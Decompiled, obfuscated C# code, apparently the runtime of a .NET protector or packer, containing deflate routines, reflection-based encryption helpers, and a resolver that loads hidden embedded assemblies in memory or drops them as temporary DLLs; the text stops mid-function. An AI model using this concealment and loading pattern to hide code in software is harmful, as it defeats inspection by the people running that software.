using System;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using ns1;
using ns3;

namespace ns2;

internal class Class22
{
	unsafe static void smethod_0(byte[] codeLengths, Class11.Class15 class15_0)
	{
		void* ptr = stackalloc byte[68];
		int[] array = new int[16];
		int[] array2 = new int[16];
		*(int*)ptr = 0;
		while (*(int*)ptr < codeLengths.Length)
		{
			*(int*)((byte*)ptr + 4) = codeLengths[*(int*)ptr];
			if (*(int*)((byte*)ptr + 4) > 0)
			{
				int[] array3;
				int[] array4 = (array3 = array);
				int num = *(int*)((byte*)ptr + 4);
				nint num2 = num;
				array4[num] = array3[num2] + 1;
			}
			(*(int*)ptr)++;
		}
		*(int*)((byte*)ptr + 8) = 0;
		*(int*)((byte*)ptr + 12) = 512;
		*(int*)((byte*)ptr + 16) = 1;
		while (*(int*)((byte*)ptr + 16) <= 15)
		{
			array2[*(int*)((byte*)ptr + 16)] = *(int*)((byte*)ptr + 8);
			*(int*)((byte*)ptr + 8) += array[*(int*)((byte*)ptr + 16)] << 16 - *(int*)((byte*)ptr + 16);
			if (*(int*)((byte*)ptr + 16) >= 10)
			{
				*(int*)((byte*)ptr + 20) = array2[*(int*)((byte*)ptr + 16)] & 0x1FF80;
				*(int*)((byte*)ptr + 24) = *(int*)((byte*)ptr + 8) & 0x1FF80;
				*(int*)((byte*)ptr + 12) += *(int*)((byte*)ptr + 24) - *(int*)((byte*)ptr + 20) >> 16 - *(int*)((byte*)ptr + 16);
			}
			(*(int*)((byte*)ptr + 16))++;
		}
		class15_0.short_0 = new short[*(int*)((byte*)ptr + 12)];
		*(int*)((byte*)ptr + 28) = 512;
		*(int*)((byte*)ptr + 32) = 15;
		while (*(int*)((byte*)ptr + 32) >= 10)
		{
			*(int*)((byte*)ptr + 36) = *(int*)((byte*)ptr + 8) & 0x1FF80;
			*(int*)((byte*)ptr + 8) -= array[*(int*)((byte*)ptr + 32)] << 16 - *(int*)((byte*)ptr + 32);
			*(int*)((byte*)ptr + 40) = *(int*)((byte*)ptr + 8) & 0x1FF80;
			*(int*)((byte*)ptr + 44) = *(int*)((byte*)ptr + 40);
			while (*(int*)((byte*)ptr + 44) < *(int*)((byte*)ptr + 36))
			{
				class15_0.short_0[Class22.smethod_61(*(int*)((byte*)ptr + 44))] = (short)((-(*(int*)((byte*)ptr + 28)) << 4) | *(int*)((byte*)ptr + 32));
				*(int*)((byte*)ptr + 28) += 1 << *(int*)((byte*)ptr + 32) - 9;
				*(int*)((byte*)ptr + 44) += 128;
			}
			(*(int*)((byte*)ptr + 32))--;
		}
		*(int*)((byte*)ptr + 48) = 0;
		while (*(int*)((byte*)ptr + 48) < codeLengths.Length)
		{
			*(int*)((byte*)ptr + 52) = codeLengths[*(int*)((byte*)ptr + 48)];
			if (*(int*)((byte*)ptr + 52) != 0)
			{
				*(int*)((byte*)ptr + 8) = array2[*(int*)((byte*)ptr + 52)];
				*(int*)((byte*)ptr + 56) = Class22.smethod_61(*(int*)((byte*)ptr + 8));
				if (*(int*)((byte*)ptr + 52) <= 9)
				{
					do
					{
						class15_0.short_0[*(int*)((byte*)ptr + 56)] = (short)((*(int*)((byte*)ptr + 48) << 4) | *(int*)((byte*)ptr + 52));
						*(int*)((byte*)ptr + 56) += 1 << *(int*)((byte*)ptr + 52);
					}
					while (*(int*)((byte*)ptr + 56) < 512);
				}
				else
				{
					*(int*)((byte*)ptr + 60) = class15_0.short_0[*(int*)((byte*)ptr + 56) & 0x1FF];
					*(int*)((byte*)ptr + 64) = 1 << (*(int*)((byte*)ptr + 60) & 0xF);
					*(int*)((byte*)ptr + 60) = -(*(int*)((byte*)ptr + 60) >> 4);
					do
					{
						class15_0.short_0[*(int*)((byte*)ptr + 60) | (*(int*)((byte*)ptr + 56) >> 9)] = (short)((*(int*)((byte*)ptr + 48) << 4) | *(int*)((byte*)ptr + 52));
						*(int*)((byte*)ptr + 56) += 1 << *(int*)((byte*)ptr + 52);
					}
					while (*(int*)((byte*)ptr + 56) < *(int*)((byte*)ptr + 64));
				}
				array2[*(int*)((byte*)ptr + 52)] = *(int*)((byte*)ptr + 8) + (1 << 16 - *(int*)((byte*)ptr + 52));
			}
			(*(int*)((byte*)ptr + 48))++;
		}
	}

	unsafe static void smethod_1(Class11.Class18.Class19 class19_0)
	{
		void* ptr = stackalloc byte[36];
		*(int*)ptr = class19_0.short_0.Length;
		int[] array = new int[*(int*)ptr];
		int num = 0;
		int num2 = 0;
		*(int*)((byte*)ptr + 4) = 0;
		while (*(int*)((byte*)ptr + 4) < *(int*)ptr)
		{
			*(int*)((byte*)ptr + 8) = class19_0.short_0[*(int*)((byte*)ptr + 4)];
			if (*(int*)((byte*)ptr + 8) != 0)
			{
				int num3 = num++;
				int num4;
				while (num3 > 0 && class19_0.short_0[array[num4 = (num3 - 1) / 2]] > *(int*)((byte*)ptr + 8))
				{
					array[num3] = array[num4];
					num3 = num4;
				}
				array[num3] = *(int*)((byte*)ptr + 4);
				num2 = *(int*)((byte*)ptr + 4);
			}
			(*(int*)((byte*)ptr + 4))++;
		}
		while (num < 2)
		{
			int num5 = ((num2 < 2) ? (++num2) : 0);
			array[num++] = num5;
		}
		class19_0.int_1 = Math.Max(num2 + 1, class19_0.int_0);
		*(int*)((byte*)ptr + 12) = num;
		int[] array2 = new int[4 * num - 2];
		int[] array3 = new int[2 * num - 1];
		int num6 = *(int*)((byte*)ptr + 12);
		*(int*)((byte*)ptr + 16) = 0;
		while (*(int*)((byte*)ptr + 16) < num)
		{
			*(int*)((byte*)ptr + 20) = array[*(int*)((byte*)ptr + 16)];
			array2[2 * *(int*)((byte*)ptr + 16)] = *(int*)((byte*)ptr + 20);
			array2[2 * *(int*)((byte*)ptr + 16) + 1] = -1;
			array3[*(int*)((byte*)ptr + 16)] = class19_0.short_0[*(int*)((byte*)ptr + 20)] << 8;
			array[*(int*)((byte*)ptr + 16)] = *(int*)((byte*)ptr + 16);
			(*(int*)((byte*)ptr + 16))++;
		}
		do
		{
			*(int*)((byte*)ptr + 24) = array[0];
			int num7 = array[--num];
			int num8 = 0;
			int num9;
			for (num9 = 1; num9 < num; num9 = num9 * 2 + 1)
			{
				if (num9 + 1 < num && array3[array[num9]] > array3[array[num9 + 1]])
				{
					num9++;
				}
				array[num8] = array[num9];
				num8 = num9;
			}
			int num10 = array3[num7];
			while ((num9 = num8) > 0 && array3[array[num8 = (num9 - 1) / 2]] > num10)
			{
				array[num9] = array[num8];
			}
			array[num9] = num7;
			*(int*)((byte*)ptr + 28) = array[0];
			num7 = num6++;
			array2[2 * num7] = *(int*)((byte*)ptr + 24);
			array2[2 * num7 + 1] = *(int*)((byte*)ptr + 28);
			*(int*)((byte*)ptr + 32) = Math.Min(array3[*(int*)((byte*)ptr + 24)] & 0xFF, array3[*(int*)((byte*)ptr + 28)] & 0xFF);
			num10 = (array3[num7] = array3[*(int*)((byte*)ptr + 24)] + array3[*(int*)((byte*)ptr + 28)] - *(int*)((byte*)ptr + 32) + 1);
			num8 = 0;
			for (num9 = 1; num9 < num; num9 = num8 * 2 + 1)
			{
				if (num9 + 1 < num && array3[array[num9]] > array3[array[num9 + 1]])
				{
					num9++;
				}
				array[num8] = array[num9];
				num8 = num9;
			}
			while ((num9 = num8) > 0 && array3[array[num8 = (num9 - 1) / 2]] > num10)
			{
				array[num9] = array[num8];
			}
			array[num9] = num7;
		}
		while (num > 1);
		Class22.smethod_35(class19_0, array2);
	}

	unsafe static void smethod_2(Class11.Class18.Class19 blTree, Class11.Class18.Class19 class19_0)
	{
		void* ptr = stackalloc byte[20];
		*(int*)((byte*)ptr + 8) = -1;
		*(int*)((byte*)ptr + 12) = 0;
		while (*(int*)((byte*)ptr + 12) < class19_0.int_1)
		{
			int num = 1;
			*(int*)((byte*)ptr + 16) = class19_0.byte_0[*(int*)((byte*)ptr + 12)];
			if (*(int*)((byte*)ptr + 16) == 0)
			{
				*(int*)ptr = 138;
				*(int*)((byte*)ptr + 4) = 3;
			}
			else
			{
				*(int*)ptr = 6;
				*(int*)((byte*)ptr + 4) = 3;
				if (*(int*)((byte*)ptr + 8) != *(int*)((byte*)ptr + 16))
				{
					Class22.smethod_28(blTree, *(int*)((byte*)ptr + 16));
					num = 0;
				}
			}
			*(int*)((byte*)ptr + 8) = *(int*)((byte*)ptr + 16);
			(*(int*)((byte*)ptr + 12))++;
			while (*(int*)((byte*)ptr + 12) < class19_0.int_1 && *(int*)((byte*)ptr + 8) == class19_0.byte_0[*(int*)((byte*)ptr + 12)])
			{
				(*(int*)((byte*)ptr + 12))++;
				if (++num >= *(int*)ptr)
				{
					break;
				}
			}
			if (num < *(int*)((byte*)ptr + 4))
			{
				while (num-- > 0)
				{
					Class22.smethod_28(blTree, *(int*)((byte*)ptr + 8));
				}
			}
			else if (*(int*)((byte*)ptr + 8) != 0)
			{
				Class22.smethod_28(blTree, 16);
				Class22.smethod_54(class19_0.class18_0.class21_0, num - 3, 2);
			}
			else if (num <= 10)
			{
				Class22.smethod_28(blTree, 17);
				Class22.smethod_54(class19_0.class18_0.class21_0, num - 3, 3);
			}
			else
			{
				Class22.smethod_28(blTree, 18);
				Class22.smethod_54(class19_0.class18_0.class21_0, num - 11, 7);
			}
		}
	}

	static ICryptoTransform smethod_3(bool key, Class9 iv, byte[] decrypt, byte[] byte_0)
	{
		iv.type_0.GetProperty("Key")!.GetSetMethod()!.Invoke(iv.object_0, new object[1] { byte_0 });
		iv.type_0.GetProperty("IV")!.GetSetMethod()!.Invoke(iv.object_0, new object[1] { decrypt });
		MethodInfo method = iv.type_0.GetMethod(key ? "CreateDecryptor" : "CreateEncryptor", new Type[0]);
		return (ICryptoTransform)method.Invoke(iv.object_0, new object[0]);
	}

	static ICryptoTransform smethod_4(bool key, byte[] iv, Class10 decrypt, byte[] byte_0)
	{
		decrypt.type_0.GetProperty("Key")!.GetSetMethod()!.Invoke(decrypt.object_0, new object[1] { iv });
		decrypt.type_0.GetProperty("IV")!.GetSetMethod()!.Invoke(decrypt.object_0, new object[1] { byte_0 });
		MethodInfo method = decrypt.type_0.GetMethod(key ? "CreateDecryptor" : "CreateEncryptor", new Type[0]);
		return (ICryptoTransform)method.Invoke(decrypt.object_0, new object[0]);
	}

	static void smethod_5(Class11.Stream0 value, int int_0)
	{
		value.WriteByte((byte)((uint)int_0 & 0xFFu));
		value.WriteByte((byte)((uint)(int_0 >> 8) & 0xFFu));
	}

	static void smethod_6(Class11.Class14 repStart, int len, int dist, int int_0)
	{
		while (dist-- > 0)
		{
			repStart.byte_0[repStart.int_2++] = repStart.byte_0[len++];
			repStart.int_2 &= 32767;
			len &= 0x7FFF;
		}
	}

	static void smethod_7(Class11.Class18 class18_0)
	{
		class18_0.int_9 = 0;
		class18_0.int_10 = 0;
	}

	static byte[] smethod_8(byte[] buffer)
	{
		return Class22.smethod_27(1, buffer, (byte[])null, (byte[])null);
	}

	static Class11.Class15 smethod_9(Class11.Class16 class16_0)
	{
		byte[] array = new byte[class16_0.int_9];
		Array.Copy(class16_0.byte_1, 0, array, 0, class16_0.int_9);
		return new Class11.Class15(array);
	}

	static int smethod_10(Class11.Class21 output, byte[] offset, int length, int int_0)
	{
		if (output.int_2 >= 8)
		{
			output.byte_0[output.int_1++] = (byte)output.uint_0;
			output.uint_0 >>= 8;
			output.int_2 -= 8;
		}
		if (int_0 > output.int_1 - output.int_0)
		{
			int_0 = output.int_1 - output.int_0;
			Array.Copy(output.byte_0, output.int_0, offset, length, int_0);
			output.int_0 = 0;
			output.int_1 = 0;
		}
		else
		{
			Array.Copy(output.byte_0, output.int_0, offset, length, int_0);
			output.int_0 += int_0;
		}
		return int_0;
	}

	unsafe static bool smethod_11(Class11.Class16 input, Class11.Class13 class13_0)
	{
		void* ptr = stackalloc byte[8];
		while (true)
		{
			switch (input.int_8)
			{
			case 5:
			{
				*(int*)((byte*)ptr + 4) = Class11.Class16.int_7[input.int_13];
				int num = Class22.smethod_57(class13_0, *(int*)((byte*)ptr + 4));
				if (num >= 0)
				{
					Class22.smethod_50(class13_0, *(int*)((byte*)ptr + 4));
					num += Class11.Class16.int_6[input.int_13];
					while (num-- > 0)
					{
						input.byte_1[input.int_14++] = input.byte_2;
					}
					if (input.int_14 == input.int_12)
					{
						return true;
					}
					goto IL_0080;
				}
				return false;
			}
			case 4:
			{
				int num2;
				while (((num2 = Class22.smethod_53(input.class15_0, class13_0)) & -16) == 0)
				{
					input.byte_1[input.int_14++] = (input.byte_2 = (byte)num2);
					if (input.int_14 == input.int_12)
					{
						return true;
					}
				}
				if (num2 >= 0)
				{
					if (num2 >= 17)
					{
						input.byte_2 = 0;
					}
					input.int_13 = num2 - 16;
					input.int_8 = 5;
					goto case 5;
				}
				return false;
			}
			case 3:
				while (input.int_14 < input.int_11)
				{
					*(int*)ptr = Class22.smethod_57(class13_0, 3);
					if (*(int*)ptr >= 0)
					{
						Class22.smethod_50(class13_0, 3);
						input.byte_0[Class11.Class16.int_15[input.int_14]] = (byte)(*(uint*)ptr);
						input.int_14++;
						continue;
					}
					return false;
				}
				input.class15_0 = new Class11.Class15(input.byte_0);
				input.byte_0 = null;
				input.int_14 = 0;
				input.int_8 = 4;
				goto case 4;
			case 2:
				input.int_11 = Class22.smethod_57(class13_0, 4);
				if (input.int_11 >= 0)
				{
					input.int_11 += 4;
					Class22.smethod_50(class13_0, 4);
					input.byte_0 = new byte[19];
					input.int_14 = 0;
					input.int_8 = 3;
					goto case 3;
				}
				return false;
			case 1:
				input.int_10 = Class22.smethod_57(class13_0, 5);
				if (input.int_10 >= 0)
				{
					input.int_10++;
					Class22.smethod_50(class13_0, 5);
					input.int_12 = input.int_9 + input.int_10;
					input.byte_1 = new byte[input.int_12];
					input.int_8 = 2;
					goto case 2;
				}
				return false;
			case 0:
				input.int_9 = Class22.smethod_57(class13_0, 5);
				if (input.int_9 >= 0)
				{
					input.int_9 += 257;
					Class22.smethod_50(class13_0, 5);
					input.int_8 = 1;
					goto case 1;
				}
				return false;
			}
			continue;
			IL_0080:
			input.int_8 = 4;
		}
	}

	static void smethod_12(Class9 class9_0)
	{
		class9_0.type_0.GetMethod("Clear")!.Invoke(class9_0.object_0, new object[0]);
	}

	static Class11.Class15 smethod_13(Class11.Class16 class16_0)
	{
		byte[] array = new byte[class16_0.int_10];
		Array.Copy(class16_0.byte_1, class16_0.int_9, array, 0, class16_0.int_10);
		return new Class11.Class15(array);
	}

	static byte[] smethod_14(byte[] buffer, byte[] key, byte[] iv)
	{
		return Class22.smethod_27(2, key, buffer, iv);
	}

	static void smethod_15(Class11.Class13 class13_0)
	{
		class13_0.uint_0 >>= class13_0.int_2 & 7;
		class13_0.int_2 &= -8;
	}

	unsafe static void smethod_16(Class11.Class18.Class19 class19_0)
	{
		void* ptr = stackalloc byte[16];
		int[] array = new int[class19_0.int_3];
		*(int*)ptr = 0;
		class19_0.short_1 = new short[class19_0.short_0.Length];
		*(int*)((byte*)ptr + 4) = 0;
		while (*(int*)((byte*)ptr + 4) < class19_0.int_3)
		{
			array[*(int*)((byte*)ptr + 4)] = *(int*)ptr;
			*(int*)ptr += class19_0.int_2[*(int*)((byte*)ptr + 4)] << 15 - *(int*)((byte*)ptr + 4);
			(*(int*)((byte*)ptr + 4))++;
		}
		*(int*)((byte*)ptr + 8) = 0;
		while (*(int*)((byte*)ptr + 8) < class19_0.int_1)
		{
			*(int*)((byte*)ptr + 12) = class19_0.byte_0[*(int*)((byte*)ptr + 8)];
			if (*(int*)((byte*)ptr + 12) > 0)
			{
				class19_0.short_1[*(int*)((byte*)ptr + 8)] = Class22.smethod_61(array[*(int*)((byte*)ptr + 12) - 1]);
				int[] array2;
				int[] array3 = (array2 = array);
				int num = *(int*)((byte*)ptr + 12) - 1;
				nint num2 = num;
				array3[num] = array2[num2] + (1 << 16 - *(int*)((byte*)ptr + 12));
			}
			(*(int*)((byte*)ptr + 8))++;
		}
	}

	unsafe static Assembly smethod_17(object sender, ResolveEventArgs e)
	{
		void* ptr = stackalloc byte[18];
		Class2.Struct0 @struct = new Class2.Struct0(e.Name);
		string s = @struct.method_0(includeVersion: false);
		string text = Convert.ToBase64String(Encoding.UTF8.GetBytes(s));
		string[] array = "ezQ0NjQ3YWY1LTFmYzctNDZkYi05YjY4LTIxMTYxMDk1M2JiYn0sIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49M2U1NjM1MDY5M2Y3MzU1ZQ==,[z]{8fc82bd4-fb23-4042-acd3-7c7a3e049f9a},ezQ0NjQ3YWY1LTFmYzctNDZkYi05YjY4LTIxMTYxMDk1M2JiYn0=,[z]{8fc82bd4-fb23-4042-acd3-7c7a3e049f9a}".Split(new char[1] { ',' });
		string text2 = string.Empty;
		((byte*)ptr)[16] = 0;
		((byte*)ptr)[17] = 0;
		*(int*)ptr = 0;
		while (*(int*)ptr < array.Length - 1)
		{
			if (!(array[*(int*)ptr] == text))
			{
				*(int*)ptr += 2;
				continue;
			}
			text2 = array[*(int*)ptr + 1];
			break;
		}
		if (text2.Length == 0 && @struct.string_2.Length == 0)
		{
			text = Convert.ToBase64String(Encoding.UTF8.GetBytes(@struct.string_0));
			*(int*)((byte*)ptr + 4) = 0;
			while (*(int*)((byte*)ptr + 4) < array.Length - 1)
			{
				if (!(array[*(int*)((byte*)ptr + 4)] == text))
				{
					*(int*)((byte*)ptr + 4) += 2;
					continue;
				}
				text2 = array[*(int*)((byte*)ptr + 4) + 1];
				break;
			}
		}
		if (text2.Length > 0)
		{
			if (text2[0] == '[')
			{
				*(int*)((byte*)ptr + 8) = text2.IndexOf(']');
				string text3 = text2.Substring(1, *(int*)((byte*)ptr + 8) - 1);
				((byte*)ptr)[16] = ((text3.IndexOf('z') >= 0) ? ((byte)1) : ((byte)0));
				((byte*)ptr)[17] = ((text3.IndexOf('t') >= 0) ? ((byte)1) : ((byte)0));
				text2 = text2.Substring(*(int*)((byte*)ptr + 8) + 1);
			}
			lock (Class2.hashtable_0)
			{
				if (Class2.hashtable_0.ContainsKey(text2))
				{
					return (Assembly)Class2.hashtable_0[text2];
				}
				Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream(text2);
				if (manifestResourceStream != null)
				{
					*(int*)((byte*)ptr + 12) = (int)manifestResourceStream.Length;
					byte[] array2 = new byte[*(int*)((byte*)ptr + 12)];
					manifestResourceStream.Read(array2, 0, *(int*)((byte*)ptr + 12));
					if (((byte*)ptr)[16] != 0)
					{
						array2 = Class22.smethod_41(array2);
					}
					Assembly assembly = null;
					if (((byte*)ptr)[17] == 0)
					{
						try
						{
							assembly = Assembly.Load(array2);
						}
						catch (FileLoadException)
						{
							((byte*)ptr)[17] = 1;
						}
						catch (BadImageFormatException)
						{
							((byte*)ptr)[17] = 1;
						}
					}
					if (((byte*)ptr)[17] != 0)
					{
						try
						{
							string text4 = $"{Path.GetTempPath()}{text2}\\";
							Directory.CreateDirectory(text4);
							string text5 = text4 + @struct.string_0 + ".dll";
							if (!File.Exists(text5))
							{
								FileStream fileStream = File.OpenWrite(text5);
								fileStream.Write(array2, 0, array2.Length);
								fileStream.Close();
								Class22.MoveFileEx(text5, (string)null, 4);
								Class22.MoveFileEx(text4, (string)null, 4);
							}
							assembly = Assembly.LoadFile(text5);
						}
						catch
						{
						}
					}
					Class2.hashtable_0[text2] = assembly;
					return assembly;
				}
			}
		}
		return null;
	}

	static bool smethod_18(Class11.Class20 class20_0)
	{
		return class20_0.int_18 == class20_0.int_17;
	}

	unsafe static bool smethod_19(int dist, Class11.Class18 len, int int_0)
	{
		void* ptr = stackalloc byte[8];
		len.short_0[len.int_9] = (short)int_0;
		len.byte_1[len.int_9++] = (byte)(dist - 3);
		*(int*)ptr = Class22.smethod_40(len, dist - 3);
		short[] short_;
		short[] array = (short_ = len.class19_0.short_0);
		int num = *(int*)ptr;
		nint num2 = num;
		array[num] = (short)(short_[num2] + 1);
		if (*(int*)ptr >= 265 && *(int*)ptr < 285)
		{
			len.int_10 += (*(int*)ptr - 261) / 4;
		}
		*(int*)((byte*)ptr + 4) = Class22.smethod_38(len, int_0 - 1);
		short[] array2 = (short_ = len.class19_1.short_0);
		int num3 = *(int*)((byte*)ptr + 4);
		num2 = num3;
		array2[num3] = (short)(short_[num2] + 1);
		if (*(int*)((byte*)ptr + 4) >= 4)
		{
			len.int_10 += *(int*)((byte*)ptr + 4) / 2 - 1;
		}
		return len.int_9 >= 16384;
	}

	static void smethod_20(int block, int offset, Class11.Class21 len, byte[] byte_0)
	{
		Array.Copy(byte_0, offset, len.byte_0, len.int_1, block);
		len.int_1 += block;
	}

	static bool smethod_21(Assembly executingAssembly, Assembly callingAssembly)
	{
		byte[] publicKey = executingAssembly.GetName().GetPublicKey();
		byte[] publicKey2 = callingAssembly.GetName().GetPublicKey();
		if (publicKey2 == null != (publicKey == null))
		{
			return false;
		}
		if (publicKey2 != null)
		{
			for (int i = 0; i < publicKey2.Length; i++)
			{
				if (publicKey2[i] != publicKey[i])
				{
					return false;
				}
			}
		}
		return true;
	}

	static int smethod_22(Class11.Class14 class14_0)
	{
		return 32768 - class14_0.int_3;
	}

	unsafe static void smethod_23(Class11.Class18 class18_0)
	{
		void* ptr = stackalloc byte[20];
		*(int*)ptr = 0;
		while (*(int*)ptr < class18_0.int_9)
		{
			*(int*)((byte*)ptr + 4) = class18_0.byte_1[*(int*)ptr] & 0xFF;
			int num = class18_0.short_0[*(int*)ptr];
			if (num-- != 0)
			{
				*(int*)((byte*)ptr + 8) = Class22.smethod_40(class18_0, *(int*)((byte*)ptr + 4));
				Class22.smethod_28(class18_0.class19_0, *(int*)((byte*)ptr + 8));
				*(int*)((byte*)ptr + 12) = (*(int*)((byte*)ptr + 8) - 261) / 4;
				if (*(int*)((byte*)ptr + 12) > 0 && *(int*)((byte*)ptr + 12) <= 5)
				{
					Class22.smethod_54(class18_0.class21_0, *(int*)((byte*)ptr + 4) & ((1 << *(int*)((byte*)ptr + 12)) - 1), *(int*)((byte*)ptr + 12));
				}
				*(int*)((byte*)ptr + 16) = Class22.smethod_38(class18_0, num);
				Class22.smethod_28(class18_0.class19_1, *(int*)((byte*)ptr + 16));
				*(int*)((byte*)ptr + 12) = *(int*)((byte*)ptr + 16) / 2 - 1;
				if (*(int*)((byte*)ptr + 12) > 0)
				{
					Class22.smethod_54(class18_0.class21_0, num & ((1 << *(int*)((byte*)ptr + 12)) - 1), *(int*)((byte*)ptr + 12));
				}
			}
			else
			{
				Class22.smethod_28(class18_0.class19_0, *(int*)((byte*)ptr + 4));
			}
			(*(int*)ptr)++;
		}
		Class22.smethod_28(class18_0.class19_0, 256);
	}

	static void smethod_24(Class11.Class14 len, int dist, int int_0)
	{
		if ((len.int_3 += dist) > 32768)
		{
			throw new InvalidOperationException();
		}
		int num = (len.int_2 - int_0) & 0x7FFF;
		int num2 = 32768 - dist;
		if (num <= num2 && len.int_2 < num2)
		{
			if (dist <= int_0)
			{
				Array.Copy(len.byte_0, num, len.byte_0, len.int_2, dist);
				len.int_2 += dist;
			}
			else
			{
				while (dist-- > 0)
				{
					len.byte_0[len.int_2++] = len.byte_0[num++];
				}
			}
		}
		else
		{
			Class22.smethod_6(len, num, dist, int_0);
		}
	}

	unsafe static void smethod_25(Class11.Class18.Class19 blTree, Class11.Class18.Class19 class19_0)
	{
		void* ptr = stackalloc byte[20];
		*(int*)((byte*)ptr + 8) = -1;
		*(int*)((byte*)ptr + 12) = 0;
		while (*(int*)((byte*)ptr + 12) < class19_0.int_1)
		{
			int num = 1;
			*(int*)((byte*)ptr + 16) = class19_0.byte_0[*(int*)((byte*)ptr + 12)];
			if (*(int*)((byte*)ptr + 16) == 0)
			{
				*(int*)ptr = 138;
				*(int*)((byte*)ptr + 4) = 3;
			}
			else
			{
				*(int*)ptr = 6;
				*(int*)((byte*)ptr + 4) = 3;
				if (*(int*)((byte*)ptr + 8) != *(int*)((byte*)ptr + 16))
				{
					short[] short_;
					short[] array = (short_ = blTree.short_0);
					int num2 = *(int*)((byte*)ptr + 16);
					nint num3 = num2;
					array[num2] = (short)(short_[num3] + 1);
					num = 0;
				}
			}
			*(int*)((byte*)ptr + 8) = *(int*)((byte*)ptr + 16);
			(*(int*)((byte*)ptr + 12))++;
			while (*(int*)((byte*)ptr + 12) < class19_0.int_1 && *(int*)((byte*)ptr + 8) == class19_0.byte_0[*(int*)((byte*)ptr + 12)])
			{
				(*(int*)((byte*)ptr + 12))++;
				if (++num >= *(int*)ptr)
				{
					break;
				}
			}
			if (num < *(int*)((byte*)ptr + 4))
			{
				short[] short_;
				short[] array2 = (short_ = blTree.short_0);
				int num4 = *(int*)((byte*)ptr + 8);
				nint num3 = num4;
				array2[num4] = (short)(short_[num3] + (short)num);
			}
			else if (*(int*)((byte*)ptr + 8) != 0)
			{
				short[] short_;
				(short_ = blTree.short_0)[16] = (short)(short_[16] + 1);
			}
			else if (num <= 10)
			{
				short[] short_;
				(short_ = blTree.short_0)[17] = (short)(short_[17] + 1);
			}
			else
			{
				short[] short_;
				(short_ = blTree.short_0)[18] = (short)(short_[18] + 1);
			}
		}
	}

	static int smethod_26(Class11.Stream0 stream0_0)
	{
		return stream0_0.ReadByte() | (stream0_0.ReadByte() << 8);
	}

	unsafe static byte[] smethod_27(int buffer, byte[] version, byte[] key, byte[] iv)
	{
		void* ptr = stackalloc byte[64];
		try
		{
			Class11.Stream0 stream = new Class11.Stream0();
			switch (buffer)
			{
			case 0:
			{
				Class11.Class17 class2 = new Class11.Class17();
				DateTime now = DateTime.Now;
				*(long*)ptr = (uint)((((now.Year - 1980) & 0x7F) << 25) | (now.Month << 21) | (now.Day << 16) | (now.Hour << 11) | (now.Minute << 5) | (int)((uint)now.Second >> 1));
				uint[] array8 = new uint[256]
				{
					0u, 1996959894u, 3993919788u, 2567524794u, 124634137u, 1886057615u, 3915621685u, 2657392035u, 249268274u, 2044508324u,
					3772115230u, 2547177864u, 162941995u, 2125561021u, 3887607047u, 2428444049u, 498536548u, 1789927666u, 4089016648u, 2227061214u,
					450548861u, 1843258603u, 4107580753u, 2211677639u, 325883990u, 1684777152u, 4251122042u, 2321926636u, 335633487u, 1661365465u,
					4195302755u, 2366115317u, 997073096u, 1281953886u, 3579855332u, 2724688242u, 1006888145u, 1258607687u, 3524101629u, 2768942443u,
					901097722u, 1119000684u, 3686517206u, 2898065728u, 853044451u, 1172266101u, 3705015759u, 2882616665u, 651767980u, 1373503546u,
					3369554304u, 3218104598u, 565507253u, 1454621731u, 3485111705u, 3099436303u, 671266974u, 1594198024u, 3322730930u, 2970347812u,
					795835527u, 1483230225u, 3244367275u, 3060149565u, 1994146192u, 31158534u, 2563907772u, 4023717930u, 1907459465u, 112637215u,
					2680153253u, 3904427059u, 2013776290u, 251722036u, 2517215374u, 3775830040u, 2137656763u, 141376813u, 2439277719u, 3865271297u,
					1802195444u, 476864866u, 2238001368u, 4066508878u, 1812370925u, 453092731u, 2181625025u, 4111451223u, 1706088902u, 314042704u,
					2344532202u, 4240017532u, 1658658271u, 366619977u, 2362670323u, 4224994405u, 1303535960u, 984961486u, 2747007092u, 3569037538u,
					1256170817u, 1037604311u, 2765210733u, 3554079995u, 1131014506u, 879679996u, 2909243462u, 3663771856u, 1141124467u, 855842277u,
					2852801631u, 3708648649u, 1342533948u, 654459306u, 3188396048u, 3373015174u, 1466479909u, 544179635u, 3110523913u, 3462522015u,
					1591671054u, 702138776u, 2966460450u, 3352799412u, 1504918807u, 783551873u, 3082640443u, 3233442989u, 3988292384u, 2596254646u,
					62317068u, 1957810842u, 3939845945u, 2647816111u, 81470997u, 1943803523u, 3814918930u, 2489596804u, 225274430u, 2053790376u,
					3826175755u, 2466906013u, 167816743u, 2097651377u, 4027552580u, 2265490386u, 503444072u, 1762050814u, 4150417245u, 2154129355u,
					426522225u, 1852507879u, 4275313526u, 2312317920u, 282753626u, 1742555852u, 4189708143u, 2394877945u, 397917763u, 1622183637u,
					3604390888u, 2714866558u, 953729732u, 1340076626u, 3518719985u, 2797360999u, 1068828381u, 1219638859u, 3624741850u, 2936675148u,
					906185462u, 1090812512u, 3747672003u, 2825379669u, 829329135u, 1181335161u, 3412177804u, 3160834842u, 628085408u, 1382605366u,
					3423369109u, 3138078467u, 570562233u, 1426400815u, 3317316542u, 2998733608u, 733239954u, 1555261956u, 3268935591u, 3050360625u,
					752459403u, 1541320221u, 2607071920u, 3965973030u, 1969922972u, 40735498u, 2617837225u, 3943577151u, 1913087877u, 83908371u,
					2512341634u, 3803740692u, 2075208622u, 213261112u, 2463272603u, 3855990285u, 2094854071u, 198958881u, 2262029012u, 4057260610u,
					1759359992u, 534414190u, 2176718541u, 4139329115u, 1873836001u, 414664567u, 2282248934u, 4279200368u, 1711684554u, 285281116u,
					2405801727u, 4167216745u, 1634467795u, 376229701u, 2685067896u, 3608007406u, 1308918612u, 956543938u, 2808555105u, 3495958263u,
					1231636301u, 1047427035u, 2932959818u, 3654703836u, 1088359270u, 936918000u, 2847714899u, 3736837829u, 1202900863u, 817233897u,
					3183342108u, 3401237130u, 1404277552u, 615818150u, 3134207493u, 3453421203u, 1423857449u, 601450431u, 3009837614u, 3294710456u,
					1567103746u, 711928724u, 3020668471u, 3272380065u, 1510334235u, 755167117u
				};
				*(int*)((byte*)ptr + 40) = -1;
				uint num = *(uint*)((byte*)ptr + 40);
				int num2 = 0;
				int num3 = version.Length;
				while (--num3 >= 0)
				{
					num = array8[(num ^ version[num2++]) & 0xFF] ^ (num >> 8);
				}
				num ^= *(uint*)((byte*)ptr + 40);
				Class22.smethod_63(67324752, stream);
				Class22.smethod_5(stream, 20);
				Class22.smethod_5(stream, 0);
				Class22.smethod_5(stream, 8);
